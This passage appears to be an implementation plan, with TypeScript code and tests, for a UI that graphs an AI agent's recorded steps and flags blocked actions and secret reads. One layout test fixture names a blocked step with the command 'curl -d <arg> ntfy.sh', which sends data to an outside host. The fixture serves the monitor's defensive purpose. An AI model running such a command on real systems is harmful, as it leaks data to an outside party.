In `ui/src/graph/types.ts` replace the `Snapshot` interface and add the two new interfaces before it:

```ts
/** Counts of the steps outside the window (recorder/memory.py `hidden`). */
export interface Hidden {
  total: number
  read: number
  shell: number
  edit: number
  tool: number
  blocked: number
  warned: number
}

/** What sits above the window: the counts and the older landmark steps. */
export interface Group {
  hidden: Hidden
  flagged: readonly Step[]
}

export interface Snapshot {
  session: string | null
  steps: Step[]
  /** null when the server sent no `hidden` (mock, older server): no group. */
  hidden: Hidden | null
  flagged: Step[]
  /** Order of the step that made R1 mark the session; null when unknown. */
  markedOrder: number | null
}
```

In `ui/src/graph/testing.ts` change the import to `import type { Hidden, PlacedStep, Step } from './types'` and append:

```ts
/** A `hidden` count object: all zeros unless overridden. */
export function makeHidden(over: Partial<Hidden> = {}): Hidden {
  return { total: 0, read: 0, shell: 0, edit: 0, tool: 0, blocked: 0, warned: 0, ...over }
}
```

- [ ] **Step 2: Write the failing parse tests**

In `ui/src/graph/snapshot.test.ts` add, at the top after the imports, `const NO_GROUP = { hidden: null, flagged: [], markedOrder: null }`, import `makeHidden` from `./testing`, and change every existing `toEqual({ session: ..., steps: ... })` to spread `...NO_GROUP` into the expected object (for example `toEqual({ session: 's1', steps: [good], ...NO_GROUP })`). Then append:

```ts
describe('parseSnapshot: hidden, flagged, marked_order', () => {
  const hidden = makeHidden({ total: 7, shell: 6, read: 1, blocked: 2 })

  it('reads all three fields', () => {
    expect(parseSnapshot({ session: 's', steps: [good], hidden, flagged: [good], marked_order: 3 })).toEqual({
      session: 's',
      steps: [good],
      hidden,
      flagged: [good],
      markedOrder: 3,
    })
  })

  it('treats absent or null fields as no group', () => {
    const body = parseSnapshot({ session: 's', steps: [good], hidden: null, flagged: null, marked_order: null })
    expect(body).toEqual({ session: 's', steps: [good], ...NO_GROUP })
  })

  it.each([
    ['a missing hidden key', { ...hidden, warned: undefined }],
    ['a negative count', { ...hidden, total: -1 }],
    ['a fractional count', { ...hidden, read: 1.5 }],
    ['a string count', { ...hidden, shell: '6' }],
    ['an array', [1, 2, 3]],
    ['a string', 'many'],
  ])('rejects the whole body for hidden with %s', (_name, bad) => {
    expect(parseSnapshot({ session: 's', steps: [good], hidden: bad })).toBeNull()
  })

  it('rejects a flagged that is not an array', () => {
    expect(parseSnapshot({ session: 's', steps: [good], flagged: 'x' })).toBeNull()
  })

  it('drops a bad flagged element like a bad window step', () => {
    const body = parseSnapshot({ session: 's', steps: [good], flagged: [good, { order: 'x' }, 5] })
    expect(body?.flagged).toEqual([good])
  })

  it.each([1.5, '3', true, {}])('rejects marked_order %j', (bad) => {
    expect(parseSnapshot({ session: 's', steps: [good], marked_order: bad })).toBeNull()
  })
})
```

- [ ] **Step 3: Write the failing reducer tests**

In `ui/src/graph/window.test.ts` add `makeHidden` to the `./testing` import, `type WindowAction` to the `./window` import, add `import type { Hidden, Step } from './types'`, and append:

```ts
describe('group and marked order', () => {
  const hidden = makeHidden({ total: 5, shell: 5, blocked: 1 })
  const flagged = [makeStep(40002, { verdict: 'blocked', rule: 'R1' })]
  type Over = Partial<{ steps: Step[]; hidden: Hidden | null; flagged: Step[]; markedOrder: number | null; first: boolean }>
  const withGroup = (over: Over = {}): WindowAction => ({
    type: 'snapshot',
    session: 'a',
    steps: stepsFrom(40010, 3),
    hidden,
    flagged,
    markedOrder: 40001,
    ...over,
  })

  it('holds the group only while something is hidden', () => {
    const s = windowReducer(initialWindowState(), withGroup())
    expect(s.group).toEqual({ hidden, flagged })
    expect(s.markedOrder).toBe(40001)
    const none = windowReducer(initialWindowState(), withGroup({ hidden: makeHidden() }))
    expect(none.group).toBeNull()
    expect(windowReducer(initialWindowState(), snap('a')).group).toBeNull()
  })

  it('replaces the group and the marked order on every poll', () => {
    let s = windowReducer(initialWindowState(), withGroup())
    const next = makeHidden({ total: 6, shell: 6, blocked: 1 })
    s = windowReducer(s, withGroup({ steps: stepsFrom(40010, 4), hidden: next, flagged: [], markedOrder: null }))
    expect(s.group).toEqual({ hidden: next, flagged: [] })
    expect(s.markedOrder).toBeNull()
  })

  it('returns the same state object for an unchanged poll, group included', () => {
    const s = windowReducer(initialWindowState(), withGroup())
    const again = windowReducer(s, withGroup({ hidden: { ...hidden }, flagged: flagged.map((f) => ({ ...f })) }))
    expect(again).toBe(s)
  })

  it('returns a new state when only the group changes', () => {
    const s = windowReducer(initialWindowState(), withGroup())
    const next = windowReducer(s, withGroup({ hidden: makeHidden({ total: 6, shell: 6 }) }))
    expect(next).not.toBe(s)
    expect(next.steps).toBe(s.steps)
  })

  it('clears the group and the marked order on a different session and on New session', () => {
    const s = windowReducer(initialWindowState(), withGroup())
    const other = windowReducer(s, snap('b', stepsFrom(1, 2)))
    expect(other.group).toBeNull()
    expect(other.markedOrder).toBeNull()
    const fresh = windowReducer(s, { type: 'newSession' })
    expect(fresh.group).toBeNull()
    expect(fresh.markedOrder).toBeNull()
  })

  it('after a server restart the marked order goes away but the header chip stays', () => {
    let s = windowReducer(initialWindowState(), withGroup())
    expect(s.secretSeen).not.toBeNull()
    s = windowReducer(s, withGroup({ steps: stepsFrom(40013, 2), markedOrder: null, hidden: makeHidden() }))
    expect(s.markedOrder).toBeNull()
    expect(s.secretSeen).not.toBeNull()
  })

  describe('secretSeen from the marked order', () => {
    it('is quiet on the first response (a reload mid-session)', () => {
      const s = windowReducer(initialWindowState(), withGroup({ first: true }))
      expect(s.secretSeen).toEqual({ quiet: true, delay: 0 })
    })

    it('appears at once for a later poll when the marking step was not appended in it', () => {
      const s = windowReducer(initialWindowState(), withGroup({ markedOrder: null }))
      expect(s.secretSeen).toBeNull()
      const later = windowReducer(s, withGroup({ markedOrder: 40001 }))
      expect(later.secretSeen).toEqual({ quiet: false, delay: 0 })
    })

    it('follows the marking step\'s own stagger when it arrives in the poll', () => {
      const burst = stepsFrom(40000, 10)
      const s = windowReducer(initialWindowState(), withGroup({ steps: burst, markedOrder: 40009 }))
      const marker = s.steps.find((x) => x.order === 40009)!
      expect(s.secretSeen).toEqual({ quiet: false, delay: enterDelay(marker) })
      expect(s.secretSeen!.delay).toBeGreaterThan(0)
    })

    it('keeps the old sensitive-step rule as a fallback when the server sends no marked order', () => {
      const secret = makeStep(40001, { kind: 'read', file: '.env', sensitive: true, command: null })
      const s = windowReducer(initialWindowState(), snap('a', [makeStep(40000), secret]))
      // The secret step is slot 1 of 2 in its poll, so the chip follows its 80 ms stagger.
      expect(s.secretSeen).toEqual({ quiet: false, delay: enterDelay(s.steps[1]) })
      expect(s.secretSeen!.delay).toBe(80)
    })
  })
})
```

- [ ] **Step 4: Write the failing request and recorder tests**

In `ui/src/graph/useRecorder.test.tsx`:
- change `type Body = { session: string | null; steps: Step[] }` to
  `type Body = { session: string | null; steps: Step[]; hidden?: Hidden; flagged?: Step[]; marked_order?: number | null }`
  and add `import type { Hidden, Step } from './types'` (extend the existing `Step` import);
- change the assertion at line 47 to `expect(fetchMock).toHaveBeenCalledWith(\`/api/steps?limit=${WINDOW_SIZE}\`, expect.objectContaining({ cache: 'no-store' }))`;
- append inside the `describe('useRecorder (real mode)'` block:

```tsx
  it('passes the group and the marked order through', async () => {
    const hidden = { total: 9, read: 0, shell: 9, edit: 0, tool: 0, blocked: 1, warned: 0 }
    const flagged = stepsFrom(3, 1, { verdict: 'blocked' })
    vi.stubGlobal('fetch', vi.fn(async () => respond({ session: 's', steps: stepsFrom(40000, 3), hidden, flagged, marked_order: 2 })))
    const { result } = renderHook(() => useRecorder(false))
    await advance(0)
    expect(result.current.group).toEqual({ hidden, flagged })
    expect(result.current.markedOrder).toBe(2)
    expect(result.current.secretSeen).toEqual({ quiet: true, delay: 0 })
  })
```

In `ui/src/App.test.tsx` change line 136 to `expect(fetchMock).toHaveBeenCalledWith('/api/steps?limit=20', expect.objectContaining({ cache: 'no-store' }))` and change the `respond` helper to accept extra body fields:

```tsx
function respond(session: string | null, steps: Step[], extra: Record<string, unknown> = {}): Response {
  return { ok: true, json: async () => ({ session, steps, ...extra }) } as Response
}
```

- [ ] **Step 5: Run to verify the new tests fail**

Run: `npm --prefix ui test -- snapshot window useRecorder App`
Expected: FAIL (type errors from `tsc` are not part of `vitest run`; expect assertion failures such as `expected undefined to be ...` and the URL mismatch).

- [ ] **Step 6: Implement `snapshot.ts`**

Replace the import line and add the helpers; replace `parseSnapshot`:

```ts
import type { Hidden, Snapshot, Step, StepKind, Verdict } from './types'

const HIDDEN_KEYS = ['total', 'read', 'shell', 'edit', 'tool', 'blocked', 'warned'] as const
```

(keep `VERDICTS`, `text` and `parseStep` unchanged), then:

```ts
function count(value: unknown): number | null {
  return typeof value === 'number' && Number.isInteger(value) && value >= 0 ? value : null
}

/** null when `hidden` is absent (no group); undefined when it is malformed (a bad body). */
function parseHidden(raw: unknown): Hidden | null | undefined {
  if (raw === undefined || raw === null) return null
  if (typeof raw !== 'object' || Array.isArray(raw)) return undefined
  const r = raw as Record<string, unknown>
  const out = {} as Hidden
  for (const key of HIDDEN_KEYS) {
    const n = count(r[key])
    if (n === null) return undefined
    out[key] = n
  }
  return out
}

/**
 * Turn a parsed `/api/steps` body into a Snapshot. Returns null when the body
 * is not a plain object with a `steps` array, or when `hidden`, `flagged` or
 * `marked_order` is present but malformed (the caller treats null as a failed
 * poll / OFFLINE). Steps without a numeric `order`, a `kind` or a `verdict` are
 * dropped, in `steps` and in `flagged` alike; an explicit empty `steps` list is
 * valid. A missing `hidden` means no group (the mock, an older server).
 */
export function parseSnapshot(raw: unknown): Snapshot | null {
  if (typeof raw !== 'object' || raw === null || Array.isArray(raw)) return null
  const r = raw as Record<string, unknown>
  if (!Array.isArray(r.steps)) return null
  const session = typeof r.session === 'string' ? r.session : null
  const steps = r.steps.map(parseStep).filter((s): s is Step => s !== null)

  const hidden = parseHidden(r.hidden)
  if (hidden === undefined) return null

  let flagged: Step[] = []
  if (r.flagged !== undefined && r.flagged !== null) {
    if (!Array.isArray(r.flagged)) return null
    flagged = r.flagged.map(parseStep).filter((s): s is Step => s !== null)
  }

  const marked = r.marked_order
  if (marked !== undefined && marked !== null && !(typeof marked === 'number' && Number.isInteger(marked))) return null

  return { session, steps, hidden, flagged, markedOrder: typeof marked === 'number' ? marked : null }
}
```

- [ ] **Step 7: Replace `window.ts`**

```ts
import { enterDelay } from './choreography'
import type { Group, Hidden, PlacedStep, SecretSeen, Step } from './types'

export const WINDOW_SIZE = 20

export interface WindowState {
  /** Session whose steps are held; null when nothing is shown. */
  session: string | null
  /** The drawn window: at most 20 steps, ascending by row. */
  steps: PlacedStep[]
  /** Next row to hand out in this session. */
  nextRow: number
  secretSeen: SecretSeen | null
  /** The summary counts and flagged older steps; null unless something is hidden. */
  group: Group | null
  /** Order of the step that made R1 mark the session (from the server); null when unknown. */
  markedOrder: number | null
  /** Bumps whenever the window is reset, so the camera knows to jump. */
  epoch: number
  /** Session hidden by "New session" until a different session id arrives. */
  ignored: string | null
}

export type WindowAction =
  | {
      type: 'snapshot'
      session: string | null
      steps: Step[]
      first?: boolean
      hidden?: Hidden | null
      flagged?: Step[]
      markedOrder?: number | null
    }
  | { type: 'newSession' }

export function initialWindowState(ignored: string | null = null): WindowState {
  return { session: null, steps: [], nextRow: 0, secretSeen: null, group: null, markedOrder: null, epoch: 0, ignored }
}

function resetFrom(state: WindowState, ignored: string | null): WindowState {
  return { ...initialWindowState(ignored), epoch: state.epoch + 1 }
}

/** Field-wise equality; keys come from the objects so a new field cannot drift. */
function sameFields<T extends object>(a: T, b: T): boolean {
  const keys = Object.keys(a) as (keyof T)[]
  return keys.length === Object.keys(b).length && keys.every((k) => a[k] === b[k])
}

function sameGroup(a: Group | null, b: Group | null): boolean {
  if (a === null || b === null) return a === b
  return (
    sameFields(a.hidden, b.hidden) &&
    a.flagged.length === b.flagged.length &&
    a.flagged.every((s, i) => sameFields(s, b.flagged[i]))
  )
}

function groupOf(hidden: Hidden | null, flagged: Step[]): Group | null {
  return hidden !== null && hidden.total > 0 ? { hidden, flagged } : null
}

function newestOrder(steps: readonly { order: number }[]): number {
  return steps.reduce((max, s) => Math.max(max, s.order), -Infinity)
}

interface Merged {
  steps: PlacedStep[]
  nextRow: number
  secretSeen: SecretSeen | null
  changed: boolean
}

/**
 * Merge a poll into the held window. A known order updates in place and keeps
 * its row; an order above the newest held step is appended with the next row;
 * an unknown order below the newest held step is ignored (placing it would move
 * a box). Steps are sorted by order first.
 */
function merge(base: WindowState, incoming: readonly Step[], first: boolean, markedOrder: number | null): Merged {
  const sorted = [...incoming].sort((a, b) => a.order - b.order)
  const byOrder = new Map(base.steps.map((s) => [s.order, s]))
  let top = newestOrder(base.steps)
  let changed = false
  const updates = new Map<number, PlacedStep>()
  const appended: Step[] = []

  for (const step of sorted) {
    const known = byOrder.get(step.order)
    if (known !== undefined) {
      const next: PlacedStep = { ...known, ...step }
      if (!sameFields(known, next)) {
        updates.set(step.order, next)
        changed = true
      }
    } else if (step.order > top) {
      appended.push(step)
      top = step.order
    }
  }

  const placed: PlacedStep[] = appended.map((step, slot) => ({
    ...step,
    row: base.nextRow + slot,
    quiet: first,
    slot,
    of: appended.length,
  }))
  if (placed.length > 0) changed = true

  let secretSeen = base.secretSeen
  if (secretSeen === null && markedOrder !== null) {
    // The server names the marking step: its own entry timing if it arrives in this poll,
    // still on the first response (a reload), otherwise at once.
    const marker = placed.find((s) => s.order === markedOrder)
    secretSeen = marker !== undefined ? { quiet: marker.quiet, delay: enterDelay(marker) } : { quiet: first, delay: 0 }
  }
  if (secretSeen === null) {
    // Fallback (no marked order, e.g. after a server restart): the first sensitive step seen.
    const fresh = new Set(placed)
    for (const s of [...updates.values(), ...placed]) {
      if (s.sensitive && secretSeen === null) {
        // A step already drawn (an update in place) has no entry of its own: the chip starts at once.
        secretSeen = fresh.has(s) ? { quiet: s.quiet, delay: enterDelay(s) } : { quiet: false, delay: 0 }
      }
    }
  }
  if (secretSeen !== base.secretSeen) changed = true

  const steps = [...base.steps.map((s) => updates.get(s.order) ?? s), ...placed].slice(-WINDOW_SIZE)
  return { steps, nextRow: base.nextRow + placed.length, secretSeen, changed }
}

export function windowReducer(state: WindowState, action: WindowAction): WindowState {
  if (action.type === 'newSession') {
    if (state.session === null) return state
    return resetFrom(state, state.session)
  }

  const { session, steps, first = false, hidden = null, flagged = [], markedOrder = null } = action
  const ignored =
    session !== null && state.ignored !== null && session !== state.ignored ? null : state.ignored
  const hiddenNow = session === null || session === ignored || steps.length === 0
  if (hiddenNow) {
    if (state.session === null && state.steps.length === 0 && state.ignored === ignored) return state
    return resetFrom(state, ignored)
  }

  // A new session, or numbering that went backwards (sessions.json deleted),
  // starts a fresh window. From an empty window (page load, or after a reset)
  // the first session is a plain start: the window is already fresh.
  const switched = state.session !== null && state.session !== session
  const restart = switched || newestOrder(steps) < newestOrder(state.steps)
  const base = restart ? resetFrom(state, ignored) : state
  const merged = merge(base, steps, first, markedOrder)

  // The group and the marked order are replaced wholesale by every poll; only the
  // window steps are merged. Keep the old group object when nothing in it changed.
  const nextGroup = groupOf(hidden, flagged)
  const group = sameGroup(base.group, nextGroup) ? base.group : nextGroup

  if (
    !restart &&
    !merged.changed &&
    group === state.group &&
    markedOrder === state.markedOrder &&
    state.ignored === ignored
  ) {
    return state
  }
  return {
    session,
    // Keep the array when only the group or the marked order changed, so a memo or an
    // effect keyed on `steps` does not run for nothing.
    steps: merged.changed ? merged.steps : base.steps,
    nextRow: merged.nextRow,
    secretSeen: merged.secretSeen,
    group,
    markedOrder,
    epoch: base.epoch,
    ignored,
  }
}
```

- [ ] **Step 8: Update `useRecorder.ts`**

Add `Group` to the type import: `import type { Group, PlacedStep, SecretSeen } from './types'`. Extend the `Recorder` interface:

```ts
export interface Recorder {
  steps: readonly PlacedStep[]
  /** Summary counts and flagged older steps; null unless something is hidden. */
  group: Group | null
  /** Order of the step that made R1 mark the session; null when unknown. */
  markedOrder: number | null
  secretSeen: SecretSeen | null
  /** Bumps when the window resets; the graph remounts and the camera jumps. */
  epoch: number
  offline: boolean
  newSession: () => void
}
```

Import `WINDOW_SIZE`: `import { WINDOW_SIZE, initialWindowState, windowReducer } from './window'`. Change the fetch and the dispatch:

```ts
        const response = await fetch(`/api/steps?limit=${WINDOW_SIZE}`, { signal: controller.signal, cache: 'no-store' })
```

```ts
        dispatch({
          type: 'snapshot',
          session: snapshot.session,
          steps: snapshot.steps,
          first,
          hidden: snapshot.hidden,
          flagged: snapshot.flagged,
          markedOrder: snapshot.markedOrder,
        })
```

and extend the returned object:

```ts
  return {
    steps: state.steps,
    group: state.group,
    markedOrder: state.markedOrder,
    secretSeen: state.secretSeen,
    epoch: state.epoch,
    offline: mock ? false : offline,
    newSession,
  }
```

Update the doc comment above `useRecorder`: replace "one request, then a 1 s gap" sentence is unchanged; add "The request is `/api/steps?limit=20` (`WINDOW_SIZE`): the server decides the window."

- [ ] **Step 9: Run the web check**

Run: `npm --prefix ui run check`
Expected: pass. If `tsc` flags an existing test that built a `Snapshot` or a `WindowState` literal by hand, add the three new fields (`hidden: null, flagged: [], markedOrder: null` / `group: null, markedOrder: null`) to it.

- [ ] **Step 10: Commit**

```bash
git add ui/src
git commit -m "$(cat <<'EOF'
AG-30: read hidden, flagged and the marking step on the page

Co-Authored-By: Claude Sonnet 5.5 <noreply@anthropic.com>
EOF
)"
```

---

### Task 4: Layout and camera — the group, the lane-box caps

**Files:**
- Modify: `ui/src/graph/layout.ts`, `ui/src/graph/camera.ts`
- Modify tests: `ui/src/graph/layout.test.ts`, `ui/src/graph/camera.test.ts`

**Interfaces:**
- Consumes: `Group`, `Hidden` from `types.ts`; `makeHidden`, `makeStep`, `place`, `stepsFrom` from `testing.ts`.
- Produces (used by Task 5):
  - `layoutGraph(steps: readonly PlacedStep[], group: Group | null = null, markedOrder: number | null = null): Layout`
  - `drawnFlagged(steps, group): Step[]`, `groupRows(steps, group): number`
  - constants `SUMMARY_ID = 'summary'`, `MAX_LANE_BOXES = 15`, `MAX_RULE_BOXES = 5`; id helper `groupEdgeId(order)`
  - node types: `StepNode` data `{ step: PlacedStep; flagged: boolean; marked: boolean }`; new `SummaryNode` (type `'summary'`, data `{ hidden: Hidden }`); `GraphNode` includes it
  - `rowsOf(steps, groupRowCount = 0)` in `camera.ts`

- [ ] **Step 1: Write the failing layout tests**

Append to `ui/src/graph/layout.test.ts` (the file already imports `layoutPlaced`, `node`, `edge`, `has`, `centre`, `makeStep`, `place`; add `makeHidden, stepsFrom` to the `./testing` import and `MAX_LANE_BOXES, MAX_RULE_BOXES, SUMMARY_ID, drawnFlagged, groupEdgeId, groupRows` to the `./layout` import):

```ts
describe('the group above the window', () => {
  const win = (first = 40100, firstRow = 100) => place(stepsFrom(first, 20), firstRow)
  const blockedAt = (order: number) =>
    makeStep(order, { verdict: 'blocked', rule: 'R1', host: 'ntfy.sh', command: 'curl -d <arg> ntfy.sh' })
  const group = (flagged = [blockedAt(40003), makeStep(40050, { verdict: 'warned', rule: 'R2' })]) => ({
    hidden: makeHidden({ total: 97, shell: 97, blocked: 1, warned: 1 }),
    flagged,
  })

  it('stacks the summary, the flagged steps and then the window, from rows that may be negative', () => {
    const layout = layoutPlaced(win(), group())
    expect(node(layout, SUMMARY_ID).position.y).toBe(centre(97) - STEP_H / 2)
    expect(node(layout, 'step:40003').position.y).toBe(centre(98) - STEP_H / 2)
    expect(node(layout, 'step:40050').position.y).toBe(centre(99) - STEP_H / 2)
    expect(node(layout, 'step:40100').position.y).toBe(centre(100) - STEP_H / 2)
    const early = layoutPlaced(win(40010, 3), group())
    expect(node(early, SUMMARY_ID).position.y).toBe(centre(0) - STEP_H / 2)
    const negative = layoutPlaced(win(40010, 1), group())
    expect(node(negative, SUMMARY_ID).position.y).toBe(centre(-2) - STEP_H / 2)
  })

  it('joins the group in a chain with quiet edges keyed on the target, and not to the window', () => {
    const layout = layoutPlaced(win(), group())
    expect(edge(layout, groupEdgeId(40003))).toMatchObject({ source: SUMMARY_ID, target: 'step:40003', sourceHandle: 'b', targetHandle: 't' })
    expect(edge(layout, groupEdgeId(40050))).toMatchObject({ source: 'step:40003', target: 'step:40050' })
    for (const id of [groupEdgeId(40003), groupEdgeId(40050)]) expect(edge(layout, id).data).toMatchObject({ quiet: true })
    expect(layout.edges.some((e) => e.target === 'step:40100' && e.source !== 'step:40100' && e.id.startsWith('group'))).toBe(false)
    expect(layout.edges.some((e) => e.source === 'step:40050' && e.target === 'step:40100')).toBe(false)
  })

  it('draws a summary alone when nothing is flagged', () => {
    const layout = layoutPlaced(win(), group([]))
    expect(node(layout, SUMMARY_ID).position.y).toBe(centre(99) - STEP_H / 2)
    expect(layout.edges.filter((e) => e.id.startsWith('group-edge'))).toEqual([])
    expect(groupRows(win(), group([]))).toBe(1)
  })

  it('draws no group for none, or for no window', () => {
    expect(has(layoutPlaced(win(), null), SUMMARY_ID)).toBe(false)
    expect(layoutPlaced([], group())).toEqual({ nodes: [], edges: [] })
    expect(groupRows(win(), null)).toBe(0)
  })

  it('gives flagged steps no lane boxes of their own, and they never touch a shared box', () => {
    const flagged = [makeStep(40003, { kind: 'read', file: 'shared.txt', command: null, verdict: 'blocked', rule: 'R1', host: 'x.com' })]
    const steps = win()
    steps[10] = { ...steps[10], kind: 'read', file: 'shared.txt', command: null }
    const layout = layoutPlaced(steps, group(flagged))
    const box = node(layout, 'file:shared.txt')
    expect(box.data).toMatchObject({ count: 1, anchorRow: 110, lastTouchRow: 110 })
    expect(layout.nodes.some((n) => n.id === 'host:x.com' || n.id === 'rule:R1')).toBe(false)
    expect(layout.edges.some((e) => e.id === 'file-edge:40003' || e.id === 'host-edge:40003' || e.id === 'rule-edge:40003')).toBe(false)
  })

  it('never draws a node id twice: the window wins over a flagged step, and a repeated flagged step counts once', () => {
    const inWindow = makeStep(40105, { verdict: 'blocked', rule: 'R1' })
    const layout = layoutPlaced(win(), group([blockedAt(40003), inWindow, blockedAt(40003)]))
    const ids = layout.nodes.map((n) => n.id)
    expect(new Set(ids).size).toBe(ids.length)
    expect(drawnFlagged(win(), group([blockedAt(40003), inWindow, blockedAt(40003)])).map((s) => s.order)).toEqual([40003])
    expect(node(layout, 'step:40105').position.y).toBe(centre(105) - STEP_H / 2)
  })

  it('marks the marking step wherever it is drawn', () => {
    const layout = layoutPlaced(win(), group(), 40003)
    expect(node(layout, 'step:40003').data).toMatchObject({ flagged: true, marked: true })
    expect(node(layout, 'step:40050').data).toMatchObject({ flagged: true, marked: false })
    const inWindow = layoutPlaced(win(), group(), 40105)
    expect(node(inWindow, 'step:40105').data).toMatchObject({ flagged: false, marked: true })
    expect(node(inWindow, 'step:40100').data).toMatchObject({ flagged: false, marked: false })
  })

  it('takes no coordinate from order: orders near 1 and near 100,000 lay out the same', () => {
    const shape = (first: number) =>
      layoutPlaced(place(stepsFrom(first, 20), 100), {
        hidden: makeHidden({ total: 5, shell: 5, blocked: 1 }),
        flagged: [makeStep(first - 50, { verdict: 'blocked', rule: 'R1' })],
      }).nodes.map((n) => n.position)
    expect(shape(100_000)).toEqual(shape(60))
  })

  it('moves the whole group down one row when the window slides, with the same ids', () => {
    const before = layoutPlaced(win(40100, 100), group())
    const slid = [...place(stepsFrom(40101, 19), 101), ...place([makeStep(40120)], 120)]
    const after = layoutPlaced(slid, group())
    for (const id of [SUMMARY_ID, 'step:40003', 'step:40050']) {
      expect(node(after, id).position.y - node(before, id).position.y, id).toBe(ROW_PITCH)
      expect(node(after, id).position.x).toBe(node(before, id).position.x)
    }
    for (const id of ['step:40105', 'step:40119']) expect(node(after, id).position).toEqual(node(before, id).position)
  })

  it('moves nothing in the group when the departing step becomes flagged, and the step keeps its node id and place', () => {
    const departing = blockedAt(40100)
    const before = layoutPlaced(win(40100, 100), group())
    const slid = [...place(stepsFrom(40101, 19), 101), ...place([makeStep(40120)], 120)]
    const after = layoutPlaced(slid, group([blockedAt(40003), makeStep(40050, { verdict: 'warned', rule: 'R2' }), departing]))
    for (const id of [SUMMARY_ID, 'step:40003', 'step:40050']) expect(node(after, id).position, id).toEqual(node(before, id).position)
    expect(node(after, 'step:40100').position).toEqual(node(before, 'step:40100').position)
    expect(edge(after, groupEdgeId(40100)).source).toBe('step:40050')
  })
})

describe('lane box caps', () => {
  const count = (layout: Layout, type: string) => layout.nodes.filter((n) => n.type === type).length

  it('draws at most 15 file and host boxes, dropping the least recently touched, and their edges with them', () => {
    const steps = place(Array.from({ length: 20 }, (_, i) => makeStep(i + 1, { kind: 'read', file: `f${i}`, command: null })))
    const layout = layoutPlaced(steps)
    expect(count(layout, 'file')).toBe(MAX_LANE_BOXES)
    for (let i = 0; i < 5; i++) {
      expect(has(layout, `file:f${i}`), `f${i}`).toBe(false)
      expect(layout.edges.some((e) => e.id === `file-edge:${i + 1}`)).toBe(false)
      expect(has(layout, `step:${i + 1}`)).toBe(true)
    }
    for (let i = 5; i < 20; i++) expect(has(layout, `file:f${i}`)).toBe(true)
  })

  it('counts files and hosts together, and drops a file before a host on a tie', () => {
    const steps = [
      makeStep(1, { kind: 'read', file: 'a', host: 'h', command: null }),
      ...Array.from({ length: 14 }, (_, i) => makeStep(i + 2, { kind: 'read', file: `f${i}`, command: null })),
    ]
    const layout = layoutPlaced(place(steps))
    expect(count(layout, 'file') + count(layout, 'host')).toBe(MAX_LANE_BOXES)
    expect(has(layout, 'file:a')).toBe(false)
    expect(has(layout, 'host:h')).toBe(true)
  })

  it('draws at most 5 rule boxes', () => {
    const steps = place(Array.from({ length: 8 }, (_, i) => makeStep(i + 1, { verdict: 'blocked', rule: `R${i}`, host: 'x.com' })))
    const layout = layoutPlaced(steps)
    expect(count(layout, 'rule')).toBe(MAX_RULE_BOXES)
    expect(has(layout, 'rule:R0')).toBe(false)
    expect(has(layout, 'rule:R7')).toBe(true)
  })

  it('never brings a box back without a touch as the window slides', () => {
    const stream = Array.from({ length: 70 }, (_, i) =>
      makeStep(i + 1, {
        kind: 'read',
        file: `f${(i * 7 + 3) % 25}`,
        host: i % 3 === 0 ? `h${i % 8}` : null,
        command: null,
      }),
    )
    const lane = (layout: Layout) => new Set(layout.nodes.filter((n) => n.type === 'file' || n.type === 'host').map((n) => n.id))
    let before = lane(layoutPlaced(place(stream.slice(0, 20), 0)))
    for (let start = 1; start <= 50; start++) {
      const newest = stream[start + 19]
      const after = lane(layoutPlaced(place(stream.slice(start, start + 20), start)))
      const touched = new Set([`file:${newest.file}`, ...(newest.host === null ? [] : [`host:${newest.host}`])])
      for (const id of after) expect(before.has(id) || touched.has(id), `${id} returned at ${start}`).toBe(true)
      before = after
    }
  })

  // Guards the tie-break: swapping it for `anchorRow` (which changes when a toucher leaves) fails this
  // test (43 violations over the 300 seeds when tried) while the fixed (kind, id) tie-break passes.
  it('never brings a box back without a touch, over 300 seeded random streams', () => {
    const rng = (seed: number) => {
      let a = seed
      return () => {
        a = (a + 0x6d2b79f5) | 0
        let t = Math.imul(a ^ (a >>> 15), 1 | a)
        t = (t + Math.imul(t ^ (t >>> 7), 61 | t)) ^ t
        return ((t ^ (t >>> 14)) >>> 0) / 4294967296
      }
    }
    const boxes = (layout: Layout) =>
      new Set(layout.nodes.filter((n) => n.type === 'file' || n.type === 'host' || n.type === 'rule').map((n) => n.id))
    const returned: string[] = []
    for (let seed = 1; seed <= 300; seed++) {
      const next = rng(seed)
      const pick = (n: number) => Math.floor(next() * n)
      const stream = Array.from({ length: 80 }, (_, i) =>
        makeStep(i + 1, {
          kind: 'read',
          file: next() < 0.8 ? `f${pick(25)}` : null,
          host: next() < 0.5 ? `h${pick(10)}` : null,
          rule: next() < 0.3 ? `R${pick(8)}` : null,
          command: null,
        }),
      )
      let before = boxes(layoutPlaced(place(stream.slice(0, 20), 0)))
      for (let start = 1; start <= 60; start++) {
        const newest = stream[start + 19]
        const after = boxes(layoutPlaced(place(stream.slice(start, start + 20), start)))
        const touched = new Set([
          ...(newest.file === null ? [] : [`file:${newest.file}`]),
          ...(newest.host === null ? [] : [`host:${newest.host}`]),
          ...(newest.rule === null ? [] : [`rule:${newest.rule}`]),
        ])
        for (const id of after) if (!before.has(id) && !touched.has(id)) returned.push(`seed ${seed} start ${start}: ${id}`)
        before = after
      }
    }
    expect(returned).toEqual([])
  })
})
```

In `ui/src/graph/camera.test.ts` append:

```ts
describe('rowsOf with a group', () => {
  it('starts at the group top and leaves last alone', () => {
    expect(rowsOf(place(stepsFrom(1, 3), 7), 4)).toEqual({ first: 3, last: 9 })
    expect(rowsOf(place(stepsFrom(1, 3), 7), 0)).toEqual({ first: 7, last: 9 })
    expect(rowsOf([], 3)).toEqual({ first: 0, last: -1 })
  })

  it('lets the pan range reach a group above row 0', () => {
    const rows = rowsOf(place(stepsFrom(1, 20), 1), 6)
    const [[, top]] = panExtent(rows, PANE)
    expect(top).toBe(-5 * ROW_PITCH - TOP_PAD)
  })
})
```

- [ ] **Step 2: Run to verify they fail**

Run: `npm --prefix ui test -- layout camera`
Expected: FAIL (`SUMMARY_ID` etc. not exported; `rowsOf` ignores the second argument).

- [ ] **Step 3: Implement `camera.ts`**

Replace `rowsOf`:

```ts
/**
 * `groupRowCount` is the rows the group takes above the oldest window row (the
 * summary plus the drawn flagged steps; 0 for no group), so the pan range and
 * the follow target treat the summary row as the first row.
 */
export function rowsOf(steps: readonly PlacedStep[], groupRowCount = 0): Rows {
  const first = steps[0]
  const last = steps.at(-1)
  if (first === undefined || last === undefined) return { first: 0, last: -1 }
  return { first: first.row - groupRowCount, last: last.row }
}
```

- [ ] **Step 4: Implement `layout.ts`**

(a) Imports and types. Change the types import to `import type { Group, Hidden, PlacedStep, Step } from './types'`. Replace the node type block:

```ts
export type StepNode = Node<{ step: PlacedStep; flagged: boolean; marked: boolean }, 'step'>
